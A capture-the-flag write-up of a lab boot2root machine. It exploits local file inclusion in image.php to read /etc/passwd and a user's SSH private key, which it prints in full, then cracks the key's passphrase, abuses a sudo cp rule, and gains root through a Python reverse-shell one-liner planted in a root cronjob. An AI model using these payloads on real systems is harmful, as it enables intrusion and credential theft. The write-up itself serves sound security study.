# The Projects

Creating a new resource and getting an IP to the resource:

> IP: 54.194.16.253

To root this box, I'm running Kali Linux[1], which has almost every tool and resource pre-installed.

## User

> Category: Boot2Root/Educational (You can ask for hints if you are stuck)
> 
> Are you ready to get an initial foothold on this super duper secure machine? You are looking for a text file called user.txt located in the home directory  of a user. Spin up an instance and see what all the fuzz is about!
> 
> Brute forcing / Fuzzing is allowed on this challenge.
> 
> Click here for access to the machine.

### nmap
Always start with `nmap` running in the background to find open ports and services:
```
❯ nmap -p- -sC -sV -A 54.194.16.253
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 09:37 CET
Nmap scan report for ec2-54-194-16-253.eu-west-1.compute.amazonaws.com (54.194.16.253)
Host is up (0.071s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.5
22/tcp open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 12e3bc998ab44d4b746cce14b5217ef9 (ECDSA)
|_  256 164a5f96510221e9fde5b64dd6f5ca18 (ED25519)
25/tcp open  smtp       Postfix smtpd
|_smtp-commands: ip-10-0-0-117.eu-west-1.compute.internal, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=ip-10-0-0-117.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-0-0-117.eu-west-1.compute.internal
| Not valid before: 2022-10-28T10:55:00
|_Not valid after:  2032-10-25T10:55:00
|_ssl-date: TLS randomness does not represent time
53/tcp open  tcpwrapped
80/tcp open  http       Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Project landing page
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host:  ip-10-0-0-117.eu-west-1.compute.internal; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

* -p-: Scan ports from 1 through 65535
* -sC: Run default scripts
* -sV: Probe open ports to determine service/version info
* -A: Enable OS detection, version detection, script scanning, and traceroute

The server is running `FTP`, `SSH`, `SMTP`, something on port 53 (`DNS`?) and `HTTP`.

Checking out the source code of the `Project landing page` and seeing:
```html
    <link rel="stylesheet" href="phpGalleryStyle.css">
```

This might be interesting. Looks like the site is running some kind of PHP gallery!

### gobuster
Running som enumeration on the HTTP-service, and including the fileextensions `.php` (since it looks like the page is running some kind of PHP gallery):
```
❯ gobuster dir -u http://54.194.16.253 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php                    
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://54.194.16.253
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/11/07 10:11:16 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/functions.php        (Status: 200) [Size: 0]
/gallery.php          (Status: 200) [Size: 1362]
/image.php            (Status: 500) [Size: 1293]
/index.php            (Status: 200) [Size: 1573]
/index.php            (Status: 200) [Size: 1573]
/server-status        (Status: 403) [Size: 278]
```

### Gallery
This looks kind of interesting! Checking out the `gallery.php` page and finding a small gallery with four images. Three of them looks pretty generic, but the fourth one looks promising!

![EPT To Vegas][image:eptToVegas.jpg]

The text on it says:
> !!IMPORTANT!!
>
> Remember to put password.txt in /home/lara

Could be important going on.

After opening one of the images in the gallery, the URL changes to:
```
http://54.194.16.253/image.php?i=phpGallery_images/eptToVegas.JPG
```

### LFI
The parameter `-i` needs both directory and file. Perhaps this is vulnerable to `LFI`[2] (`Local File Inclusion`)? Checking with `/etc/passwd`:
```
http://54.194.16.253/image.php?i=/etc/passwd
```

This returns the content of `/etc/passwd`!
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:102:105::/nonexistent:/usr/sbin/nologin systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin syslog:x:104:111::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin _chrony:x:113:120:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false fwupd-refresh:x:114:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin ftp:x:115:123:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin postfix:x:116:124::/var/spool/postfix:/usr/sbin/nologin tom:x:1001:1001::/home/tom:/bin/sh lara:x:1002:1002::/home/lara:/bin/sh
```

(A prettier formated version is in the source of the page, or you could just use `curl http://54.194.16.253/image.php?i=/etc/passwd`).

Noticing a couple of the users:
```
root:x:0:0:root:/root:/bin/bash
tom:x:1001:1001::/home/tom:/bin/sh
lara:x:1002:1002::/home/lara:/bin/sh
```

Checking out `http://54.194.16.253/image.php?i=/home/lara/password.txt`, but unfortunately it doesn't give us any content. What we do know, is that there are a couple of users. One thing to check for is private keys:
* `/home/lara/.ssh/id_rsa`
* `/home/tom/.ssh/id_rsa`

Doesn't look like the current user has access to lara's home directory, but we're a little luckier with tom!
```
curl http://54.194.16.253/image.php?i=/home/tom/.ssh/id_rsa
[…]
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBYh5PbQ6
jNxRqfR68r2ex/AAAAEAAAAAEAAACXAAAAB3NzaC1yc2EAAAADAQABAAAAgQCf0qpOLsNY
kGBKsQK8nqnG/cR6RmViy2AameL/XNRBE7IxHNj+ViS/B6kg76q/MhpiSzhl1x0oUOaHmp
bSlcBT0CBV7hQoMQcDnpBzrpezhUjZOQky52GOlpvBM+fUI9VeRYbYZTa69jKYogtc/F2+
7Mev+9BdQKfABUUFBOMswQAAAhC3NsAuacV1IbvWVAuEPBSPYWfeLv/SUYxKKoUo8vIR/c
oIw+EioNAe6Zc6eG/DJIPWmIsKdx5h7Jrs9aGxtH2BtfROwN0PEw7D6gqMFtA9NS75DhBZ
3Fg2bKsoly8BTj7FL8cqUXqfShn3TgKdYgIqSbPG911tZKmSvkJqgbvr86kuwPrvjvVulb
bYk5z4mcsShsOU5hfjq9rfISPpWzhw5cHH/rFLnEjjJXPwJy7GguNiMuU85wWMhdQTvX6G
5NjuLNoG7fPpF/mN+701/nZSDTbxwOPZ+OvqY5rVIetXE/eIKMDdlbc5m3pd7+YDJKsark
KGbcUYhkVcvE6ditqJJbnpMbuXfbntNqtSSoBZD3r/IpbvkuTPxpJpQGJJFoX+6a963r/0
gud687aR0TWaWGE0RIqE65oE9Qw4AOHfCIRVrXl7qpKkqoyppicOwkTy8IbDa5UNT6UwYa
Llq3LzaGT+NJ+QuTQ7hJvZsgsxNKGuKXqXykEzUfq/ZtYRt16tZ23ykUd/8KuhoaWqMbCL
uND1m7ULmZiOgLwKOvTGys6KC+n88E3gC8MRBOWkI3CWQ7VvXEUeWefyWROPEFmqpInBNG
ILl00zdB33L95W7e11LJz6IV6YzbI2RtZRc/TqyFLz2lEMTt6Rd7OWvb2N+Xu/kvEhQuuB
z590wYXCO8WzsU4HA9vRkm1uyGbJTiA=
-----END OPENSSH PRIVATE KEY-----
[…]
```

### ssh key and cracking
Saving the key as `tom.key` and making sure the permissions are set to `chmod 0600`:
```
ls -lah
-rw------- 1 kali kali 1,1K Nov  7 10:30 tom2key
```

The permissions are required to be `0600` for the key to be accepted with `ssh`.

Using the key and the username `tom` to connect to `ssh`:
```
❯ ssh 54.194.16.253 -l tom -i tom.key 
The authenticity of host '54.194.16.253 (54.194.16.253)' can't be established.
ED25519 key fingerprint is SHA256:QcYZzfWjbBR6+WTwTyvnp8GLHNQtH2V7Du/DC0QBSdo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '54.194.16.253' (ED25519) to the list of known hosts.
Enter passphrase for key 'tom.key': 
```

Hmm, a passphrase. We don't have a passphrase, but perhaps it's possible to crack it? Using `ssh2john`, `john` and the wordlist `rockyou.txt` to try to find the passphrase:
```
❯ ssh2john tom.key > tom.hash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt tom.hash 

[…]

❯ john tom.hash --show
tom.key:inuyasha
```

Now we have the passphrase!


### ssh as tom
Trying to ssh to the server once more:
```
❯ ssh 54.194.16.253 -l tom -i tom.key    
Enter passphrase for key 'tom.key': 
[…]
$ id
uid=1001(tom) gid=1001(tom) groups=1001(tom)
```

We're in! Just typing `bash` to get a better shell, and checking the content of tom's home directory:
```
tom@ip-10-0-0-91:~$ ls
user.txt
tom@ip-10-0-0-91:~$ cat user.txt |wc -c
29
```

The user flag! But we're not done, would be nice to root the box, right?

### sudo -l
Checking if tom has any access to `sudo`:
```
tom@ip-10-0-0-91:~$ sudo -l
Matching Defaults entries for tom on ip-10-0-0-91:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tom may run the following commands on ip-10-0-0-91:
    (lara) NOPASSWD: /bin/cp
```

And it does look like tom has! We may run the `/bin/cp` command (without password, which we don't have any way) as `lara`. Remembering the `/home/lara/password.txt` file mentioned in the image:
```
tom@ip-10-0-0-91:/dev/shm/myh$ chmod 0777 .
tom@ip-10-0-0-91:/dev/shm/myh$ sudo -u lara /bin/cp /home/lara/password.txt .
tom@ip-10-0-0-91:/dev/shm/myh$ ls
password.txt
tom@ip-10-0-0-91:/dev/shm/myh$ cat password.txt 
Note to self: Do not forget your password..
suP3r_s3cure!
```

### lara and privelege escalation
I kind of prefer to create a folder for myself when doing this kind of things and often end up creating `myh` in the `/dev/shm/` directory. Using the same here, and remembering to `chmod 0777 .` to make sure the `lara` user have write permissions to it.

And voilà, a password! Perhaps this is for the `lara` user?
```
tom@ip-10-0-0-91:~$ su -l lara
Password: 
$ bash
lara@ip-10-0-0-91:~$ id
uid=1002(lara) gid=1002(lara) groups=1002(lara)
```

Just using `su` to become the `lara` user, and it works! Unfortunately the `sudo` tricks doesn't work this time:
```
lara@ip-10-0-0-91:~$ sudo -l
[sudo] password for lara: 
Sorry, user lara may not run sudo on ip-10-0-0-91.
```

Using `find` to check if there's any interesting files owned by `lara` (except `/proc/` files):
```
lara@ip-10-0-0-91:/opt$ find / -user lara -ls 2>/dev/null |grep -v "/proc/"
        4      4 -rw-r--r--   1 lara     lara           58 Nov  7 09:41 /dev/shm/myh/password.txt
   288393      4 drwxr-x---   2 lara     lara         4096 Oct 28 10:55 /home/lara
   288394      4 -rw-r--r--   1 lara     lara          807 Jan  6  2022 /home/lara/.profile
   288377      4 -rw-r--r--   1 lara     lara           58 Oct 28 10:55 /home/lara/password.txt
   288395      4 -rw-r--r--   1 lara     lara          220 Jan  6  2022 /home/lara/.bash_logout
   288396      4 -rw-r--r--   1 lara     lara         3771 Jan  6  2022 /home/lara/.bashrc
      570      4 -rw-r--r--   1 lara     lara          516 Oct 28 10:55 /opt/nextGenMon.py
```

### cronjob, pspy and root
Hm, what is this `/opt/nextGenMon.py` thing?
```python
lara@ip-10-0-0-91:/opt$ cat /opt/nextGenMon.py 
import os

evil_IPs = ["84.17.60.99","84.17.60.90","84.17.60.69","84.17.58.6","84.17.58.16","84.17.58.10","84.17.52.25","84.17.52.24","84.17.48.74"]
logdir = "/var/log/apache2/"
files = os.listdir(logdir)

for file in files:
    data = open(f"{logdir}{file}").read().splitlines()
    for logline in data:
        for ip in evil_IPs:
            if ip in logline:
                print("THREAT ACTOR DETECTED")
                f = open("/home/lara/ALARM.txt", "a")
                f.write(f"{ip} detected in {file}")
```

We do have write permissions to the file. Perhaps this is something being run by `root`? Using `pspy`[3]  to check for running processes. To get the file to the remote server, you could the the following:

On remote server:
```bash
nc -lvnp 1337 > pspy
```

And then locally:
```bash
cat pspy | nc 54.194.16.253 1337
```

Then we can make `pspy` executable and run with!
```
chmod +x pspy
./pspy -i 1
```

And huzzah! It looks like `root` is running a `cronjob`:
```
2022/11/07 09:53:01 CMD: UID=0     PID=3594   | /usr/bin/python3 /opt/nextGenMon.py 
2022/11/07 09:53:01 CMD: UID=0     PID=3593   | /bin/sh -c /usr/bin/python3 /opt/nextGenMon.py 
```

Now it's kind of only your imagination that sets the limits. Just going with a reverse python shell locally on the box. Adding the following line to `nextGenMon.py`:
```
import os,pty,socket;s=socket.socket();s.connect(("127.0.0.1",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")
```

and setting up a listener with:
```
nc -lvnp 1337
```

After a minute:
```
root@ip-10-0-0-91:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-0-0-91:~# cat root.txt |wc -c
cat root.txt |wc -c
```

And the box is rooted!

## Links
[1] https://www.kali.org/
[2] https://book.hacktricks.xyz/pentesting-web/file-inclusion
[3] https://github.com/DominicBreuker/pspy
